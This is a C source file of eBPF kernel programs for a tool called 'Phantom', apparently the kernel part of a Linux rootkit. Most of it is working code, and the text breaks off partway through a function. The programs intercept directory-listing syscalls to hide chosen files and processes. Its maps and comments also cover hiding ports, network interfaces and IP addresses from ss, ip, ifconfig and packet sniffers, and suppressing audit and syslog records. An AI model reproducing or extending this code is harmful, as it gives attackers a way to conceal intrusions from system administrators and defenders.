// SPDX-License-Identifier: MIT
/*
 * phantom.bpf.c - Kernel BPF programs for Phantom hiding hooks.
 *
 * Intercepts syscalls and modifies results before userspace sees them.
 * Covers getdents (files/processes), /proc/net/tcp and SOCK_DIAG (ports),
 * NETLINK_ROUTE, SIOCGIFCONF, /proc/net/dev (ifaces/IPs), AF_PACKET
 * (sniffers), syslog/audit suppression, and file content filtering.
 *
 * eBPF constraints: no heap allocation, 512-byte stack, bounded loops,
 * __noinline on large helpers. One SEC program per hook path.
 */

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_endian.h>
#include "phantom.h"

/* GPL license required for bpf_probe_read_user and related helpers. */
char LICENSE[] SEC("license") = "GPL";

// ============================================================
// BPF Maps - shared between BPF and userspace (phantom.c)
// ============================================================

/*
 * str_buf - Per-CPU 256-byte scratch for string operations.
 */
struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, char[256]);
} str_buf SEC(".maps");

/*
 * events - Ring buffer of hide/capture events for userspace logging.
 */
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} events SEC(".maps");

/*
 * hidden_pid_bits - Userspace-maintained PID bitmap (not read by BPF here).
 *
 * Process hiding in this file uses hidden_proc_names (hash of /proc dir
 * names). Userspace may still maintain this bitmap for bookkeeping.
 *
 * Layout: byte index = PID >> 3, bit index = PID & 7.
 */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, HIDDEN_PID_BITMAP_BYTES);
    __type(key, __u32);
    __type(value, __u8);
} hidden_pid_bits SEC(".maps");

/*
 * hidden_proc_names - /proc directory names to hide (e.g. "1234").
 *
 * String keys avoid numeric PID parsing in bpf_loop callbacks.
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_HIDDEN_PIDS);
    __type(key, char[16]);  /* PID directory name, e.g. "1234" */
    __type(value, __u8);
} hidden_proc_names SEC(".maps");

/*
 * hidden_proc_path_prefixes - LPM trie of exe path prefixes to hide.
 *
 * Used with process hide / hide-prefix. At sched_process_exec, the
 * exec'd filename is looked up here; on hit, the new PID is added to
 * hidden_proc_names so getdents /proc filtering hides it.
 *
 * Key: { prefixlen (bits), data[MAX_PROC_PATH_PREFIX_LEN] }
 */
struct {
    __uint(type, BPF_MAP_TYPE_LPM_TRIE);
    __uint(max_entries, MAX_HIDDEN_PROC_PATH_PREFIXES);
    __uint(map_flags, BPF_F_NO_PREALLOC);
    __type(key, struct {
        __u32 prefixlen;
        char data[MAX_PROC_PATH_PREFIX_LEN];
    });
    __type(value, __u8);
} hidden_proc_path_prefixes SEC(".maps");

/*
 * hidden_prefixes - LPM trie of filename prefixes to hide.
 *
 * Key: { prefixlen (bits), data[MAX_PREFIX_LEN] }.
 */
struct {
    __uint(type, BPF_MAP_TYPE_LPM_TRIE);
    __uint(max_entries, MAX_HIDDEN_PREFIXES);
    __uint(map_flags, BPF_F_NO_PREALLOC);
    __type(key, struct {
        __u32 prefixlen; /* in bits */
        char data[MAX_PREFIX_LEN];
    });
    __type(value, __u8);
} hidden_prefixes SEC(".maps");

/*
 * hidden_files - Exact filenames to hide.
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_HIDDEN_FILES);
    __type(key, char[MAX_FILENAME_LEN]);
    __type(value, __u8);
} hidden_files SEC(".maps");

/*
 * hidden_port_bits - Bitmap of ports to hide (0-65535, 8192 bytes).
 *
 * Used by two paths:
 *   - /proc/net/tcp and /proc/net/tcp6 read(): blank matching lines
 *   - SOCK_DIAG recvmsg (ss): drop/compact matching netlink messages
 */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, HIDDEN_PORT_BITMAP_BYTES);
    __type(key, __u32);
    __type(value, __u8);
} hidden_port_bits SEC(".maps");

/*
 * hidden_exec_names - Process name prefixes that trigger exec capture.
 *
 * On match at sched_process_exec, PID is added to hidden_exec_pids.
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 64);
    __type(key, char[16]);  /* process name (TASK_COMM_LEN) */
    __type(value, __u8);
} hidden_exec_names SEC(".maps");

/*
 * hidden_exec_pids - PIDs whose audit/syslog output is suppressed.
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 256);
    __type(key, __u32);   /* PID */
    __type(value, __u8);
} hidden_exec_pids SEC(".maps");

/*
 * getdents64_cache_files - Temporary storage for file-hiding getdents64 calls.
 *
 * Saves syscall arguments at entry, retrieves them at exit to process results.
 *
 * Key: tid. Value: getdents64 args (dirp, count, fd).
 *
 * Separate file and proc caches so the two hide paths do not collide.
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);
    __type(value, struct getdents_data);
} getdents64_cache_files SEC(".maps");

/*
 * getdents64_cache_procs - getdents64 enter cache for process hiding.
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);
    __type(value, struct getdents_data);
} getdents64_cache_procs SEC(".maps");

/*
 * getdents_cache_procs - getdents (32-bit) enter cache for process hiding.
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);
    __type(value, struct getdents_data);
} getdents_cache_procs SEC(".maps");

/*
 * feature_config - Array of feature toggle flags.
 *
 * Indices checked by BPF via is_config_enabled():
 *   [0] = CFG_ENABLE_FILE_HIDING
 *   [1] = CFG_ENABLE_PROCESS_HIDING
 *   [2] = CFG_ENABLE_PORT_HIDING
 *   [5] = CFG_ENABLE_EXEC_HIDING (also gates audit/syslog filtering)
 *   [6] = CFG_ENABLE_FILE_FILTER
 *   [7] = CFG_ENABLE_IFACE_HIDING
 *   [8] = CFG_ENABLE_IP_HIDING
 *
 * [3] CFG_ENABLE_AUDIT_BLOCKING and [4] CFG_ENABLE_TIMESTOMP are written
 * by userspace for bookkeeping; BPF does not read them (audit/syslog use
 * EXEC_HIDING; timestomp runs in userspace).
 */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 10);
    __type(key, __u32);
    __type(value, __u32);
} feature_config SEC(".maps");

/*
 * target_ppid - Parent PID filter (optional).
 *
 * If set to a non-zero value, only hide things for processes whose
 * parent PID matches this value. If zero, hide from ALL processes.
 */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u32);
} target_ppid SEC(".maps");

/*
 * File content filtering maps
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u64);
    __type(value, char[MAX_FILE_FILTER_PATH]);
} file_filter_fds SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_FILE_FILTERS);
    __type(key, char[MAX_FILE_FILTER_PATH]);
    __type(value, struct file_filter_rule);
} file_filter_rules SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, char[4096]);
} file_filter_scratch SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 4096);
    __type(key, __u64);
    __type(value, struct file_leftover_ctx);
} file_filter_leftover SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u64);
    __type(value, char[MAX_FILE_FILTER_PATH]);
} file_filter_pending SEC(".maps");

/*
 * file_filter_exempt_comms - Process names exempt from file content filtering.
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_FILE_FILTER_EXEMPTS);
    __type(key, char[TASK_COMM_LEN]);
    __type(value, __u8);
} file_filter_exempt_comms SEC(".maps");

/*
 * file_filter_exempt_pids - PIDs exempt from file content filtering.
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 256);
    __type(key, __u32);
    __type(value, __u8);
} file_filter_exempt_pids SEC(".maps");

/*
 * hidden_iface_names - Hash map of interface names to hide.
 * Used by NETLINK_ROUTE (`ip a`), /proc/net/dev, and SIOCGIFCONF (ifconfig).
 * Key: Interface name string (e.g., "docker0")
 * Value: 1 (presence means hide)
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 32);
    __type(key, char[16]);
    __type(value, __u8);
} hidden_iface_names SEC(".maps");

/*
 * hidden_ifindexes - ifindexes of hidden interfaces.
 * Populated from userspace and when RTM_NEWLINK is hidden. RTM_NEWADDR
 * for a hidden ifindex must also drop or glibc getifaddrs retries (-EAGAIN).
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 32);
    __type(key, __u32);
    __type(value, __u8);
} hidden_ifindexes SEC(".maps");

/*
 * hidden_ip_addrs - LPM trie for IP address hiding from `ip a` and network sniffers.
 * Supports exact matches (prefixlen=32) and CIDR prefix matches (prefixlen=8,16,24).
 * Key: { prefixlen (in bits), data (4 bytes for IPv4) }
 * Value: 1 (presence means hide)
 */
struct {
    __uint(type, BPF_MAP_TYPE_LPM_TRIE);
    __uint(max_entries, 64);
    __uint(map_flags, BPF_F_NO_PREALLOC);
    __type(key, struct {
        __u32 prefixlen;
        __u8 data[4];
    });
    __type(value, __u8);
} hidden_ip_addrs SEC(".maps");

/*
 * tracked_netlink_route_fds - AF_NETLINK + NETLINK_ROUTE socket fds.
 * Any client of NETLINK_ROUTE (commonly `ip a`) is tracked, not only iproute2.
 * Key: (PID << 32) | fd
 * Value: 1
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u64);
    __type(value, __u8);
} tracked_netlink_route_fds SEC(".maps");

/*
 * tracked_af_packet_fds - AF_PACKET socket fds (used by tcpdump/Wireshark).
 * Key: (PID << 32) | fd
 * Value: 1
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, __u64);
    __type(value, __u8);
} tracked_af_packet_fds SEC(".maps");

// ============================================================
// Helper functions
// ============================================================

/*
 * get_str_buf - Per-CPU string scratch buffer.
 *
 * Returns: pointer to 256-byte buffer, or NULL on lookup failure
 */
static __always_inline char *get_str_buf(void)
{
    __u32 key = 0;
    return bpf_map_lookup_elem(&str_buf, &key);
}

/*
 * is_config_enabled - True if feature_config[index] is non-zero.
 */
static __always_inline int is_config_enabled(__u32 key)
{
    __u32 *val = bpf_map_lookup_elem(&feature_config, &key);
    if (!val)
        return 0;
    return *val != 0;
}

/*
 * port_is_hidden - True if port is set in hidden_port_bits.
 *
 * Layout: byte = port >> 3, bit = port & 7.
 */
static __always_inline int port_is_hidden(__u32 port)
{
    if (port > 65535)
        return 0;

    __u32 key = port >> 3;     /* Byte index: port / 8 */
    __u8 *byte = bpf_map_lookup_elem(&hidden_port_bits, &key);
    if (!byte)
        return 0;

    return (*byte >> (port & 7)) & 1;  /* Check specific bit */
}

/*
 * emit_hide_event - Reserve and submit a ringbuf hide/capture event.
 *
 * Sets type, pid, tid, comm, filename, success=1.
 */
static __always_inline void emit_hide_event(__u32 type, const char *fname)
{
    /* Reserve ringbuf slot */
    struct event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e)
        return;

    /* pid/tgid */
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    e->type = type;
    e->pid = (__u32)(pid_tgid >> 32);  /* pid */
    e->tid = (__u32)pid_tgid;          /* tid */
    e->success = 1;

    /* comm */
    __builtin_memset(e->comm, 0, sizeof(e->comm));
    bpf_get_current_comm(e->comm, sizeof(e->comm));

    /* filename via bpf_probe_read_kernel_str */
    __builtin_memset(e->filename, 0, sizeof(e->filename));
    bpf_probe_read_kernel_str(e->filename, sizeof(e->filename), fname);

    e->inode = 0;
    e->port = 0;

    /* submit */
    bpf_ringbuf_submit(e, 0);
}

/*
 * emit_hide_event_port - Ringbuf event for a hidden port (EVENT_PORT_HIDDEN).
 */
static __always_inline void emit_hide_event_port(__u32 port, const char *what)
{
    struct event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e)
        return;

    __u64 pid_tgid = bpf_get_current_pid_tgid();
    e->type = EVENT_PORT_HIDDEN;
    e->pid = (__u32)(pid_tgid >> 32);
    e->tid = (__u32)pid_tgid;
    e->success = 1;
    __builtin_memset(e->comm, 0, sizeof(e->comm));
    bpf_get_current_comm(e->comm, sizeof(e->comm));
    __builtin_memset(e->filename, 0, sizeof(e->filename));
    __builtin_memcpy(e->filename, what, sizeof(e->filename) - 1);
    e->inode = 0;
    e->port = port;

    bpf_ringbuf_submit(e, 0);
}

/*
 * emit_write_fail - Ringbuf EVENT_ERROR when bpf_probe_write_user fails.
 *
 * errno is stored in event.port (positive value).
 */
static __always_inline void emit_write_fail(const char *what, long err)
{
    struct event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e)
        return;

    __u64 pid_tgid = bpf_get_current_pid_tgid();
    e->type = EVENT_ERROR;
    e->pid = (__u32)(pid_tgid >> 32);
    e->tid = (__u32)pid_tgid;
    e->success = 0;
    __builtin_memset(e->comm, 0, sizeof(e->comm));
    bpf_get_current_comm(e->comm, sizeof(e->comm));
    __builtin_memset(e->filename, 0, sizeof(e->filename));
    __builtin_memcpy(e->filename, what, sizeof(e->filename) - 1);
    e->inode = 0;
    /* errno in port field */
    e->port = (err < 0) ? (__u32)(-err) : 0;

    bpf_ringbuf_submit(e, 0);
}

// ============================================================
// File content filtering helpers
// ============================================================

/*
 * path_has_filter_rule - True if path has an entry in file_filter_rules.
 */
static __always_inline int path_has_filter_rule(const char *path)
{
    return bpf_map_lookup_elem(&file_filter_rules, path) != NULL;
}

/*
 * is_file_filter_exempt - True if current comm or PID is in exemption maps.
 */
static __always_inline int is_file_filter_exempt(void)
{
    char comm[TASK_COMM_LEN] = {};
    bpf_get_current_comm(comm, sizeof(comm));
    if (bpf_map_lookup_elem(&file_filter_exempt_comms, comm))
        return 1;

    __u32 pid = (__u32)(bpf_get_current_pid_tgid() >> 32);
    if (bpf_map_lookup_elem(&file_filter_exempt_pids, &pid))
        return 1;

    return 0;
}

static __noinline int should_hide_proc_name(const char *name);
static __noinline __u32 filter_route_user_buf(void *ubuf, __u32 n);

/*
 * read_user_recvmsg_base - iov_base from userspace msghdr.
 *
 * Do not use CO-RE struct user_msghdr: wrong msg_iov can corrupt userspace.
 *
 * x86_64/aarch64 glibc msghdr: msg_iov@16; iovec iov_base@0.
 */
static __always_inline void *read_user_recvmsg_base(void *user_msghdr)
{
    void *iov = NULL;
    void *base = NULL;

    if (!user_msghdr)
        return NULL;
    if (bpf_probe_read_user(&iov, sizeof(iov), (char *)user_msghdr + 16) < 0)
        return NULL;
    if (!iov)
        return NULL;
    if (bpf_probe_read_user(&base, sizeof(base), iov) < 0)
        return NULL;
    return base;
}

/*
 * scan_ctx64 - State while scanning a getdents64 userspace buffer.
 *
 * prev_offset/prev_reclen support reclen merge when hiding an entry.
 */
struct scan_ctx64 {
    __u64 dirp;
    long ret;
    __u64 offset;
    __u64 prev_offset;
    __u16 prev_reclen;
};

/*
 * scan64_cb - bpf_loop callback: hide one linux_dirent64 per iteration.
 *
 * Hidden entries merge into the previous dirent via d_reclen, or zero
 * d_ino/d_name when there is no predecessor. Uses BPF_CORE_READ_USER.
 *
 * Returns: 1 to stop (past buffer end), 0 to continue
 */
static __noinline long scan64_cb(__u32 i, void *ctxp)
{
    struct scan_ctx64 *c = ctxp;

    /* If past the end of the buffer, stop */
    if (c->offset >= (__u64)c->ret)
        return 1;

    /* Cast user buffer pointer to CO-RE aware dirent struct */
    struct linux_dirent64 *dent = (struct linux_dirent64 *)(c->dirp + c->offset);

    /* Read d_reclen using CO-RE field relocation */
    __u16 reclen = 0;
    reclen = BPF_CORE_READ_USER(dent, d_reclen);
    if (reclen == 0 || reclen > 512)
        return 1;

    /* Read the filename using CO-RE string read */
    char name[MAX_FILENAME_LEN];
    __builtin_memset(name, 0, sizeof(name));
    BPF_CORE_READ_USER_STR_INTO(&name, dent, d_name);

    /* Check if this /proc directory entry name should be hidden (hashmap lookup) */
    int should_hide = should_hide_proc_name(name);

    if (should_hide) {
        if (c->prev_reclen > 0) {
            /* Extend previous dirent reclen over this entry */
            struct linux_dirent64 *prev =
                (struct linux_dirent64 *)(c->dirp + c->prev_offset);
            __u16 new_reclen = c->prev_reclen + reclen;
            bpf_probe_write_user(&prev->d_reclen,
                                 &new_reclen, sizeof(new_reclen));
            c->prev_reclen = new_reclen;
            c->offset += reclen;
            return 0;
        }

        /* No predecessor: zero inode and first name byte */
        __u64 zero_ino = 0;
        char zero = 0;
        bpf_probe_write_user(&dent->d_ino,
                             &zero_ino, sizeof(zero_ino));
        bpf_probe_write_user(dent->d_name,
                             &zero, sizeof(zero));

        c->prev_offset = c->offset;
        c->prev_reclen = reclen;
        c->offset += reclen;
        return 0;
    }

    /* Track last visible entry for reclen merge */
    c->prev_offset = c->offset;
    c->prev_reclen = reclen;
    c->offset += reclen;
    return 0;
}

/*
 * scan_ctx32 - getdents (32-bit linux_dirent) scan state.
 *
 * 32-bit layout: d_ino 4, d_off 4, d_reclen 2, d_name @10.
 */
struct scan_ctx32 {
    __u64 dirp;
    long ret;
    __u64 offset;
    __u64 prev_offset;
    __u16 prev_reclen;
};

/* linux_dirent: d_reclen @8, d_name @10 */
/*
 * scan32_cb - bpf_loop callback for 32-bit getdents (same hide logic as scan64_cb).
 */
static __always_inline long scan32_cb(__u32 i, void *ctxp)
{
    struct scan_ctx32 *c = ctxp;
    if (c->offset >= (__u64)c->ret)
        return 1;

    /* Cast user buffer pointer to CO-RE aware 32-bit dirent struct */
    struct linux_dirent *dent = (struct linux_dirent *)(c->dirp + c->offset);

    /* Read d_reclen using CO-RE field relocation */
    __u16 reclen = 0;
    reclen = BPF_CORE_READ_USER(dent, d_reclen);
    if (reclen == 0 || reclen > 512)
        return 1;

    /* Read the filename using CO-RE string read */
    char name[MAX_FILENAME_LEN];
    __builtin_memset(name, 0, sizeof(name));
    BPF_CORE_READ_USER_STR_INTO(&name, dent, d_name);

    /* Check if this /proc directory entry name should be hidden (hashmap lookup) */
    int should_hide = should_hide_proc_name(name);

    if (should_hide) {
        emit_hide_event(EVENT_PROCESS_HIDDEN, name);
        if (c->prev_reclen > 0) {
            struct linux_dirent *prev =
                (struct linux_dirent *)(c->dirp + c->prev_offset);
            __u16 new_reclen = c->prev_reclen + reclen;
            long w = bpf_probe_write_user(&prev->d_reclen,
                                          &new_reclen, sizeof(new_reclen));
            if (w < 0)
                emit_write_fail("write_reclen32p", w);
            c->prev_reclen = new_reclen;
            c->offset += reclen;
            return 0;
        }

        __u32 zero_ino = 0;
        char zero = 0;
        long w1 = bpf_probe_write_user(&dent->d_ino,
                                       &zero_ino, sizeof(zero_ino));
        if (w1 < 0)
            emit_write_fail("write_ino32p", w1);
        long w2 = bpf_probe_write_user(dent->d_name,
                                       &zero, sizeof(zero));
        if (w2 < 0)
            emit_write_fail("write_name0_32p", w2);

        c->prev_offset = c->offset;
        c->prev_reclen = reclen;
        c->offset += reclen;
        return 0;
    }

    c->prev_offset = c->offset;
    c->prev_reclen = reclen;
    c->offset += reclen;
    return 0;
}

/*
 * should_hide_proc_name - True if name is in hidden_proc_names.
 *
 * Callers pass a kernel-buffer copy of the name (not userspace).
 * Used from bpf_loop to avoid numeric PID parsing in the callback.
 */
static __noinline int should_hide_proc_name(const char *name)
{
    char key[16];
    __builtin_memset(key, 0, sizeof(key));
    __builtin_memcpy(key, name, sizeof(key) - 1);

    __u8 *found = bpf_map_lookup_elem(&hidden_proc_names, key);
    return found != 0;
}

/*
 * iface_is_hidden - Check if a network interface name should be hidden.
 */
static __noinline int iface_is_hidden(const char *name)
{
    char key[16];
    __builtin_memset(key, 0, sizeof(key));
    /* Copy up to 15 chars */
    #pragma unroll
    for (int i = 0; i < 15; i++) {
        if (name[i] == '\0')
            break;
        key[i] = name[i];
    }
    __u8 *found = bpf_map_lookup_elem(&hidden_iface_names, key);
    return found != 0;
}

static __always_inline int ifindex_is_hidden(__u32 ifindex)
{
    if (ifindex == 0)
        return 0;
    __u8 *found = bpf_map_lookup_elem(&hidden_ifindexes, &ifindex);
    return found != 0;
}

static __always_inline void mark_ifindex_hidden(__u32 ifindex)
{
    if (ifindex == 0)
        return;
    __u8 one = 1;
    bpf_map_update_elem(&hidden_ifindexes, &ifindex, &one, BPF_ANY);
}

/*
 * ip_is_hidden - Check if an IPv4 address should be hidden.
 * addr is in network byte order (big-endian).
 */
static __always_inline int ip_is_hidden(__be32 addr)
{
    /* Try exact match first (prefixlen=32) */
    struct {
        __u32 prefixlen;
        __u8 data[4];
    } key;

    key.prefixlen = 32;
    __builtin_memcpy(key.data, &addr, 4);

    __u8 *found = bpf_map_lookup_elem(&hidden_ip_addrs, &key);
    if (found)
        return 1;

    /* Try /24 prefix */
    key.prefixlen = 24;
    __u8 zero3 = 0;
    key.data[3] = zero3;
    found = bpf_map_lookup_elem(&hidden_ip_addrs, &key);
    if (found)
        return 1;

    /* Try /16 prefix */
    key.prefixlen = 16;
    key.data[2] = zero3;
    found = bpf_map_lookup_elem(&hidden_ip_addrs, &key);
    if (found)
        return 1;

    /* Try /8 prefix */
    key.prefixlen = 8;
    key.data[1] = zero3;
    found = bpf_map_lookup_elem(&hidden_ip_addrs, &key);
    return found != 0;
}

/*
 * emit_iface_hide_event - Send interface hidden event to userspace.
 */
static __always_inline void emit_iface_hide_event(const char *name)
{
    struct event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e)
        return;

    __u64 pid_tgid = bpf_get_current_pid_tgid();
    e->type = EVENT_IFACE_HIDDEN;
    e->pid = (__u32)(pid_tgid >> 32);
    e->tid = (__u32)pid_tgid;
    e->success = 1;
    __builtin_memset(e->comm, 0, sizeof(e->comm));
    bpf_get_current_comm(e->comm, sizeof(e->comm));
    __builtin_memset(e->filename, 0, sizeof(e->filename));
    bpf_probe_read_kernel_str(e->filename, sizeof(e->filename), name);
    e->inode = 0;
    e->port = 0;
    bpf_ringbuf_submit(e, 0);
}

/*
 * emit_ip_hide_event - Send IP hidden event to userspace.
 */
static __always_inline void emit_ip_hide_event(__be32 addr)
{
    struct event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e)
        return;

    __u64 pid_tgid = bpf_get_current_pid_tgid();
    e->type = EVENT_IP_HIDDEN;
    e->pid = (__u32)(pid_tgid >> 32);
    e->tid = (__u32)pid_tgid;
    e->success = 1;
    __builtin_memset(e->comm, 0, sizeof(e->comm));
    bpf_get_current_comm(e->comm, sizeof(e->comm));
    __builtin_memset(e->filename, 0, sizeof(e->filename));
    __builtin_memcpy(e->filename, &addr, 4);
    e->inode = 0;
    e->port = 0;
    bpf_ringbuf_submit(e, 0);
}

/*
 * should_hide_filename - True if name matches hidden_files or hidden_prefixes.
 *
 * Uses per-CPU str_buf for lookup keys (stack limit).
 */
static __noinline int should_hide_filename(const char *name)
{
    char *buf = get_str_buf();
    if (!buf)
        return 0;

    /* Copy the filename into the temporary buffer for lookup */
    char *lookup_key = buf;
    /* Fixed MAX_FILENAME_LEN copy (bounded loop) */
    __builtin_memcpy(lookup_key, name, MAX_FILENAME_LEN);

    /* Check 1: Exact match in the hidden_files hash map */
    __u8 *exact = bpf_map_lookup_elem(&hidden_files, lookup_key);
    if (exact)
        return 1;

    /* Check 2: Prefix match in the hidden_prefixes LPM trie */
    struct {
        __u32 prefixlen;
        char data[MAX_PREFIX_LEN];
    } *k = (void *)(buf + MAX_FILENAME_LEN);
    __builtin_memset(k, 0, sizeof(*k));
    k->prefixlen = MAX_PREFIX_LEN * 8;  /* Maximum prefix length in bits */
    __builtin_memcpy(k->data, lookup_key, MAX_PREFIX_LEN);

    __u8 *prefix_hit = bpf_map_lookup_elem(&hidden_prefixes, k);
    if (prefix_hit)
        return 1;

    return 0;
}

/*
 * scan64_files_cb - bpf_loop callback for file hiding (should_hide_filename).
 */
static __noinline long scan64_files_cb(__u32 i, void *ctxp)
{
    struct scan_ctx64 *c = ctxp;
    if (c->offset >= (__u64)c->ret)
        return 1;

    /* Cast user buffer pointer to CO-RE aware dirent struct */
    struct linux_dirent64 *dent = (struct linux_dirent64 *)(c->dirp + c->offset);

    /* Read d_reclen using CO-RE field relocation */
    __u16 reclen = 0;
    reclen = BPF_CORE_READ_USER(dent, d_reclen);
    if (reclen == 0 || reclen > 512)
        return 1;

    /* Read the filename using CO-RE string read */
    char name[MAX_FILENAME_LEN];
    __builtin_memset(name, 0, sizeof(name));
    BPF_CORE_READ_USER_STR_INTO(&name, dent, d_name);

    if (should_hide_filename(name)) {
        emit_hide_event(EVENT_FILE_HIDDEN, name);

        if (c->prev_reclen > 0) {
            struct linux_dirent64 *prev =
                (struct linux_dirent64 *)(c->dirp + c->prev_offset);
            __u16 new_reclen = c->prev_reclen + reclen;
            long w = bpf_probe_write_user(&prev->d_reclen,
                                          &new_reclen, sizeof(new_reclen));
            if (w < 0)
                emit_write_fail("write_reclen", w);
            c->prev_reclen = new_reclen;
            c->offset += reclen;
            return 0;
        }

        __u64 zero_ino = 0;
        char zero = 0;
        long w1 = bpf_probe_write_user(&dent->d_ino,
                                       &zero_ino, sizeof(zero_ino));
        if (w1 < 0)
            emit_write_fail("write_ino", w1);
        long w2 = bpf_probe_write_user(dent->d_name,
                                       &zero, sizeof(zero));
        if (w2 < 0)
            emit_write_fail("write_name0", w2);

        c->prev_offset = c->offset;
        c->prev_reclen = reclen;
        c->offset += reclen;
        return 0;
    }

    c->prev_offset = c->offset;
    c->prev_reclen = reclen;
    c->offset += reclen;
    return 0;
}

// getdents64 tracepoints - file hiding
// ============================================================

/*
 * phantom_getdents64_enter - sys_enter_getdents64: cache dirp for file hiding.
 *
 * args: fd, dirent buffer, count.
 */
SEC("tracepoint/syscalls/sys_enter_getdents64")
int phantom_getdents64_enter(struct trace_event_raw_sys_enter *ctx)
{
    /* Check if file hiding feature is enabled */
    int file_hiding = is_config_enabled(CFG_ENABLE_FILE_HIDING);

    if (!file_hiding)
        return 0;

    /* Get the current thread ID (used as the cache key) */
    __u64 tid = bpf_get_current_pid_tgid();

    /* Extract syscall arguments */
    unsigned int fd = (unsigned int)ctx->args[0];
    void *dirent = (void *)ctx->args[1];
    unsigned int count = (unsigned int)ctx->args[2];

    /* Save arguments to the cache for use at syscall exit */
    struct getdents_data data = {};
    data.fd = (__u32)fd;
    data.dirp = (__u64)dirent;
    data.count = (__u64)count;

    if (data.dirp == 0)
        return 0;

    bpf_map_update_elem(&getdents64_cache_files, &tid, &data, BPF_ANY);
    return 0;
}

/*
 * phantom_getdents64_exit - sys_exit_getdents64: scan buffer and hide files.
 */
SEC("tracepoint/syscalls/sys_exit_getdents64")
int phantom_getdents64_exit(struct trace_event_raw_sys_exit *ctx)
{
    int file_hiding = is_config_enabled(CFG_ENABLE_FILE_HIDING);

    if (!file_hiding)
        return 0;

    /* Get the return value (number of bytes written to buffer) */
    long ret = ctx->ret;
    if (ret <= 0)
        return 0;

    /* Look up the saved syscall arguments */
    __u64 tid = bpf_get_current_pid_tgid();
    struct getdents_data *data = bpf_map_lookup_elem(&getdents64_cache_files, &tid);
    if (!data)
        return 0;

    __u64 dirp = data->dirp;
    bpf_map_delete_elem(&getdents64_cache_files, &tid);

    /* Scan the directory buffer and hide matching files */
    struct scan_ctx64 s = {
        .dirp = dirp,
        .ret = ret,
        .offset = 0,
        .prev_offset = 0,
        .prev_reclen = 0,
    };

    /* up to 4096 dentries per read */
    bpf_loop(4096, scan64_files_cb, &s, 0);

    return 0;
}

/*
 * Proc-hiding-only handlers for getdents64.
 *
 * Separate SEC programs from file hiding.
 *
 * Matches /proc dirent names against hidden_proc_names.
 */
/*
 * phantom_getdents64_enter_proc - sys_enter_getdents64: cache dirp for proc hide.
 */
SEC("tracepoint/syscalls/sys_enter_getdents64")
int phantom_getdents64_enter_proc(struct trace_event_raw_sys_enter *ctx)
{
    if (!is_config_enabled(CFG_ENABLE_PROCESS_HIDING))
        return 0;

    __u64 tid = bpf_get_current_pid_tgid();
    void *dirent = (void *)ctx->args[1];
    if (!dirent)
        return 0;

    struct getdents_data data = {};
    data.dirp = (__u64)dirent;
    bpf_map_update_elem(&getdents64_cache_procs, &tid, &data, BPF_ANY);
    return 0;
}

/*
 * phantom_getdents64_exit_proc - sys_exit_getdents64: hide /proc entries by name.
 */
SEC("tracepoint/syscalls/sys_exit_getdents64")
int phantom_getdents64_exit_proc(struct trace_event_raw_sys_exit *ctx)
{
    if (!is_config_enabled(CFG_ENABLE_PROCESS_HIDING))
        return 0;

    long ret = ctx->ret;
    if (ret <= 0)
        return 0;

    /* ls path debug events (comm == "ls") */
    char comm[TASK_COMM_LEN];
    __builtin_memset(comm, 0, sizeof(comm));
    bpf_get_current_comm(comm, sizeof(comm));
    if (comm[0] == 'l' && comm[1] == 's' && comm[2] == '\0')
        emit_hide_event(EVENT_ERROR, "hit_ls");

    __u64 tid = bpf_get_current_pid_tgid();
    struct getdents_data *data = bpf_map_lookup_elem(&getdents64_cache_procs, &tid);
    if (!data) {
        if (comm[0] == 'l' && comm[1] == 's' && comm[2] == '\0')
            emit_hide_event(EVENT_ERROR, "no_cache64");
        return 0;
    }

    __u64 dirp = data->dirp;
    bpf_map_delete_elem(&getdents64_cache_procs, &tid);

    __u64 offset = 0;
    __u64 prev_offset = 0;
    __u16 prev_reclen = 0;
